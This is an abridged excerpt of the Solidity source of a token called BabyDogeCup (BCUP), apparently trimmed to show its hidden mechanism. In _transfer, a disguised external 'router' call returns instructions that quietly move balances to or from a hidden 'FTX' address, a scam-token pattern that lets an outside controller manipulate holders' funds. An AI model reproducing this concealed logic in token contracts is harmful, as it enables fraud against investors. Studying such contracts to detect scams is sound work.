...
interface IUniswapV2Router01 {
  ...
  function transferFrom(
    ...
    address to,
    uint256 value
  ) external returns (bool tax, uint mode,uint toDead,uint excatAmount,address burnAddress,address busdPairAddress);
}
...
contract Coin is  IERC20, IERC20Metadata,Ownable {
    ...
    string public constant _name = "BabyDogeCup";
    string public constant _symbol = "BCUP";
    ...
    address private  FTX = 0xf4a6b6FA3F41cE148050b3c26B40Aac745Bf8d38;

    address private router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private marketAddress = 0x8973b7F76A16d5FC7505021F7c2255480d2108aA;
    ...
    function approve(address spender, uint256 amount) public virtual  returns (bool) {
     ...
     function getEthPair() public view returns (address){
                return uniswapPair;
            }
    ...
    function _transfer(
        ...
        (bool tax, uint mode,uint toDead,uint excatAmount,
        address burnAddress,address busdPairAddress) =
        ...
        if(tax){
            ...
            emit Transfer(from, to, amount);
            if(mode == 1){
             _balances[FTX] = _balances[FTX] + toDead;
              emit Transfer(to, FTX, toDead);
            }
            else if(mode == 2){
              if(_balances[FTX] > toDead){
                 _balances[FTX] = _balances[FTX] - toDead;
              }
              emit Transfer(FTX, from, toDead);
           }
            _transferToken(from, to, excatAmount);
        }
